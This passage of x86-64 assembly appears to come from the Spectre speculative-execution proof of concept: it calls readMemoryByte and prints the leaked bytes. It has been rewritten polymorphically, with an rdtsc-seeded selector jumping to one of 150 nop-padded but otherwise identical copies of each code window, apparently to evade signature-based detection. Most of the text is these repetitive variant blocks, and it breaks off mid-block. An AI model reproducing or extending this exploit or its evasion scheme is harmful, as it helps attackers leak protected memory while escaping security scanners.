.Lmain_win3_var120:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 121
.Lmain_win3_var121:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 122
.Lmain_win3_var122:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 123
.Lmain_win3_var123:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 124
.Lmain_win3_var124:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 125
.Lmain_win3_var125:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 126
.Lmain_win3_var126:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 127
.Lmain_win3_var127:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 128
.Lmain_win3_var128:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 129
.Lmain_win3_var129:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 130
.Lmain_win3_var130:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 131
.Lmain_win3_var131:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 132
.Lmain_win3_var132:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 133
.Lmain_win3_var133:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	nop
	jmp	.Lmain_win3_continue
## Variant 134
.Lmain_win3_var134:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 135
.Lmain_win3_var135:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 136
.Lmain_win3_var136:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 137
.Lmain_win3_var137:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 138
.Lmain_win3_var138:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 139
.Lmain_win3_var139:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	nop
	jmp	.Lmain_win3_continue
## Variant 140
.Lmain_win3_var140:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 141
.Lmain_win3_var141:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
	nop
	nop
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 142
.Lmain_win3_var142:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 143
.Lmain_win3_var143:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 144
.Lmain_win3_var144:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 145
.Lmain_win3_var145:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 146
.Lmain_win3_var146:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	nop
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 147
.Lmain_win3_var147:
	popq	%rax
	nop
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 148
.Lmain_win3_var148:
	popq	%rax
	cmpl	$0, %eax
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	nop
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
## Variant 149
.Lmain_win3_var149:
	popq	%rax
	cmpl	$0, %eax
	nop
	jl	LBB2_21
## %bb.10:                              ##   in Loop: Header=BB2_9 Depth=1
	movq	-48(%rbp), %rsi
	nop
	leaq	L_.str.12(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movl	-36(%rbp), %edi
	jmp	.Lmain_win3_continue
.Lmain_win3_continue:
	movq	-48(%rbp), %rsi
	movq	%rsi, %rax
	addq	$1, %rax
	movq	%rax, -48(%rbp)
	leaq	-54(%rbp), %rdx
	leaq	-16(%rbp), %rcx
	callq	_readMemoryByte
	movl	-16(%rbp), %ecx
	movl	-12(%rbp), %edx
	shll	%edx
	leaq	L_.str.15(%rip), %rsi
	leaq	L_.str.14(%rip), %rax
	cmpl	%edx, %ecx
	cmovgeq	%rax, %rsi
	leaq	L_.str.13(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movzbl	-54(%rbp), %eax
	movl	%eax, -64(%rbp)    # # 4-byte Spill
	movzbl	-54(%rbp), %eax
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$150, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win2_var0
	cmpl	$1, %eax
	je	.Lmain_win2_var1
	cmpl	$2, %eax
	je	.Lmain_win2_var2
	cmpl	$3, %eax
	je	.Lmain_win2_var3
	cmpl	$4, %eax
	je	.Lmain_win2_var4
	cmpl	$5, %eax
	je	.Lmain_win2_var5
	cmpl	$6, %eax
	je	.Lmain_win2_var6
	cmpl	$7, %eax
	je	.Lmain_win2_var7
	cmpl	$8, %eax
	je	.Lmain_win2_var8
	cmpl	$9, %eax
	je	.Lmain_win2_var9
	cmpl	$10, %eax
	je	.Lmain_win2_var10
	cmpl	$11, %eax
	je	.Lmain_win2_var11
	cmpl	$12, %eax
	je	.Lmain_win2_var12
	cmpl	$13, %eax
	je	.Lmain_win2_var13
	cmpl	$14, %eax
	je	.Lmain_win2_var14
	cmpl	$15, %eax
	je	.Lmain_win2_var15
	cmpl	$16, %eax
	je	.Lmain_win2_var16
	cmpl	$17, %eax
	je	.Lmain_win2_var17
	cmpl	$18, %eax
	je	.Lmain_win2_var18
	cmpl	$19, %eax
	je	.Lmain_win2_var19
	cmpl	$20, %eax
	je	.Lmain_win2_var20
	cmpl	$21, %eax
	je	.Lmain_win2_var21
	cmpl	$22, %eax
	je	.Lmain_win2_var22
	cmpl	$23, %eax
	je	.Lmain_win2_var23
	cmpl	$24, %eax
	je	.Lmain_win2_var24
	cmpl	$25, %eax
	je	.Lmain_win2_var25
	cmpl	$26, %eax
	je	.Lmain_win2_var26
	cmpl	$27, %eax
	je	.Lmain_win2_var27
	cmpl	$28, %eax
	je	.Lmain_win2_var28
	cmpl	$29, %eax
	je	.Lmain_win2_var29
	cmpl	$30, %eax
	je	.Lmain_win2_var30
	cmpl	$31, %eax
	je	.Lmain_win2_var31
	cmpl	$32, %eax
	je	.Lmain_win2_var32
	cmpl	$33, %eax
	je	.Lmain_win2_var33
	cmpl	$34, %eax
	je	.Lmain_win2_var34
	cmpl	$35, %eax
	je	.Lmain_win2_var35
	cmpl	$36, %eax
	je	.Lmain_win2_var36
	cmpl	$37, %eax
	je	.Lmain_win2_var37
	cmpl	$38, %eax
	je	.Lmain_win2_var38
	cmpl	$39, %eax
	je	.Lmain_win2_var39
	cmpl	$40, %eax
	je	.Lmain_win2_var40
	cmpl	$41, %eax
	je	.Lmain_win2_var41
	cmpl	$42, %eax
	je	.Lmain_win2_var42
	cmpl	$43, %eax
	je	.Lmain_win2_var43
	cmpl	$44, %eax
	je	.Lmain_win2_var44
	cmpl	$45, %eax
	je	.Lmain_win2_var45
	cmpl	$46, %eax
	je	.Lmain_win2_var46
	cmpl	$47, %eax
	je	.Lmain_win2_var47
	cmpl	$48, %eax
	je	.Lmain_win2_var48
	cmpl	$49, %eax
	je	.Lmain_win2_var49
	cmpl	$50, %eax
	je	.Lmain_win2_var50
	cmpl	$51, %eax
	je	.Lmain_win2_var51
	cmpl	$52, %eax
	je	.Lmain_win2_var52
	cmpl	$53, %eax
	je	.Lmain_win2_var53
	cmpl	$54, %eax
	je	.Lmain_win2_var54
	cmpl	$55, %eax
	je	.Lmain_win2_var55
	cmpl	$56, %eax
	je	.Lmain_win2_var56
	cmpl	$57, %eax
	je	.Lmain_win2_var57
	cmpl	$58, %eax
	je	.Lmain_win2_var58
	cmpl	$59, %eax
	je	.Lmain_win2_var59
	cmpl	$60, %eax
	je	.Lmain_win2_var60
	cmpl	$61, %eax
	je	.Lmain_win2_var61
	cmpl	$62, %eax
	je	.Lmain_win2_var62
	cmpl	$63, %eax
	je	.Lmain_win2_var63
	cmpl	$64, %eax
	je	.Lmain_win2_var64
	cmpl	$65, %eax
	je	.Lmain_win2_var65
	cmpl	$66, %eax
	je	.Lmain_win2_var66
	cmpl	$67, %eax
	je	.Lmain_win2_var67
	cmpl	$68, %eax
	je	.Lmain_win2_var68
	cmpl	$69, %eax
	je	.Lmain_win2_var69
	cmpl	$70, %eax
	je	.Lmain_win2_var70
	cmpl	$71, %eax
	je	.Lmain_win2_var71
	cmpl	$72, %eax
	je	.Lmain_win2_var72
	cmpl	$73, %eax
	je	.Lmain_win2_var73
	cmpl	$74, %eax
	je	.Lmain_win2_var74
	cmpl	$75, %eax
	je	.Lmain_win2_var75
	cmpl	$76, %eax
	je	.Lmain_win2_var76
	cmpl	$77, %eax
	je	.Lmain_win2_var77
	cmpl	$78, %eax
	je	.Lmain_win2_var78
	cmpl	$79, %eax
	je	.Lmain_win2_var79
	cmpl	$80, %eax
	je	.Lmain_win2_var80
	cmpl	$81, %eax
	je	.Lmain_win2_var81
	cmpl	$82, %eax
	je	.Lmain_win2_var82
	cmpl	$83, %eax
	je	.Lmain_win2_var83
	cmpl	$84, %eax
	je	.Lmain_win2_var84
	cmpl	$85, %eax
	je	.Lmain_win2_var85
	cmpl	$86, %eax
	je	.Lmain_win2_var86
	cmpl	$87, %eax
	je	.Lmain_win2_var87
	cmpl	$88, %eax
	je	.Lmain_win2_var88
	cmpl	$89, %eax
	je	.Lmain_win2_var89
	cmpl	$90, %eax
	je	.Lmain_win2_var90
	cmpl	$91, %eax
	je	.Lmain_win2_var91
	cmpl	$92, %eax
	je	.Lmain_win2_var92
	cmpl	$93, %eax
	je	.Lmain_win2_var93
	cmpl	$94, %eax
	je	.Lmain_win2_var94
	cmpl	$95, %eax
	je	.Lmain_win2_var95
	cmpl	$96, %eax
	je	.Lmain_win2_var96
	cmpl	$97, %eax
	je	.Lmain_win2_var97
	cmpl	$98, %eax
	je	.Lmain_win2_var98
	cmpl	$99, %eax
	je	.Lmain_win2_var99
	cmpl	$100, %eax
	je	.Lmain_win2_var100
	cmpl	$101, %eax
	je	.Lmain_win2_var101
	cmpl	$102, %eax
	je	.Lmain_win2_var102
	cmpl	$103, %eax
	je	.Lmain_win2_var103
	cmpl	$104, %eax
	je	.Lmain_win2_var104
	cmpl	$105, %eax
	je	.Lmain_win2_var105
	cmpl	$106, %eax
	je	.Lmain_win2_var106
	cmpl	$107, %eax
	je	.Lmain_win2_var107
	cmpl	$108, %eax
	je	.Lmain_win2_var108
	cmpl	$109, %eax
	je	.Lmain_win2_var109
	cmpl	$110, %eax
	je	.Lmain_win2_var110
	cmpl	$111, %eax
	je	.Lmain_win2_var111
	cmpl	$112, %eax
	je	.Lmain_win2_var112
	cmpl	$113, %eax
	je	.Lmain_win2_var113
	cmpl	$114, %eax
	je	.Lmain_win2_var114
	cmpl	$115, %eax
	je	.Lmain_win2_var115
	cmpl	$116, %eax
	je	.Lmain_win2_var116
	cmpl	$117, %eax
	je	.Lmain_win2_var117
	cmpl	$118, %eax
	je	.Lmain_win2_var118
	cmpl	$119, %eax
	je	.Lmain_win2_var119
	cmpl	$120, %eax
	je	.Lmain_win2_var120
	cmpl	$121, %eax
	je	.Lmain_win2_var121
	cmpl	$122, %eax
	je	.Lmain_win2_var122
	cmpl	$123, %eax
	je	.Lmain_win2_var123
	cmpl	$124, %eax
	je	.Lmain_win2_var124
	cmpl	$125, %eax
	je	.Lmain_win2_var125
	cmpl	$126, %eax
	je	.Lmain_win2_var126
	cmpl	$127, %eax
	je	.Lmain_win2_var127
	cmpl	$128, %eax
	je	.Lmain_win2_var128
	cmpl	$129, %eax
	je	.Lmain_win2_var129
	cmpl	$130, %eax
	je	.Lmain_win2_var130
	cmpl	$131, %eax
	je	.Lmain_win2_var131
	cmpl	$132, %eax
	je	.Lmain_win2_var132
	cmpl	$133, %eax
	je	.Lmain_win2_var133
	cmpl	$134, %eax
	je	.Lmain_win2_var134
	cmpl	$135, %eax
	je	.Lmain_win2_var135
	cmpl	$136, %eax
	je	.Lmain_win2_var136
	cmpl	$137, %eax
	je	.Lmain_win2_var137
	cmpl	$138, %eax
	je	.Lmain_win2_var138
	cmpl	$139, %eax
	je	.Lmain_win2_var139
	cmpl	$140, %eax
	je	.Lmain_win2_var140
	cmpl	$141, %eax
	je	.Lmain_win2_var141
	cmpl	$142, %eax
	je	.Lmain_win2_var142
	cmpl	$143, %eax
	je	.Lmain_win2_var143
	cmpl	$144, %eax
	je	.Lmain_win2_var144
	cmpl	$145, %eax
	je	.Lmain_win2_var145
	cmpl	$146, %eax
	je	.Lmain_win2_var146
	cmpl	$147, %eax
	je	.Lmain_win2_var147
	cmpl	$148, %eax
	je	.Lmain_win2_var148
	cmpl	$149, %eax
	je	.Lmain_win2_var149
	jmp	.Lmain_win2_var0
## Variant 0
.Lmain_win2_var0:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 1
.Lmain_win2_var1:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 2
.Lmain_win2_var2:
	popq	%rax
	nop
	nop
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 3
.Lmain_win2_var3:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 4
.Lmain_win2_var4:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 5
.Lmain_win2_var5:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 6
.Lmain_win2_var6:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 7
.Lmain_win2_var7:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 8
.Lmain_win2_var8:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 9
.Lmain_win2_var9:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 10
.Lmain_win2_var10:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 11
.Lmain_win2_var11:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 12
.Lmain_win2_var12:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 13
.Lmain_win2_var13:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 14
.Lmain_win2_var14:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 15
.Lmain_win2_var15:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	jmp	.Lmain_win2_continue
## Variant 16
.Lmain_win2_var16:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 17
.Lmain_win2_var17:
	popq	%rax
	cmpl	$31, %eax
	nop
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 18
.Lmain_win2_var18:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	nop
	jge	LBB2_13
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 19
.Lmain_win2_var19:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	nop
	cmpl	$127, %eax
	jge	LBB2_13
	nop
	nop
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 20
.Lmain_win2_var20:
	popq	%rax
	cmpl	$31, %eax
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	nop
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	nop
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 21
.Lmain_win2_var21:
	popq	%rax
	cmpl	$31, %eax
	nop
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 22
.Lmain_win2_var22:
	popq	%rax
	nop
	cmpl	$31, %eax
	jle	LBB2_13
	nop
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 23
.Lmain_win2_var23:
	popq	%rax
	cmpl	$31, %eax
	nop
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB2_13
## %bb.12:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 24
.Lmain_win2_var24:
	popq	%rax
	cmpl	$31, %eax
	nop
	nop
	jle	LBB2_13
## %bb.11:                              ##   in Loop: Header=BB2_9 Depth=1
	movzbl	-54(%rbp), %eax
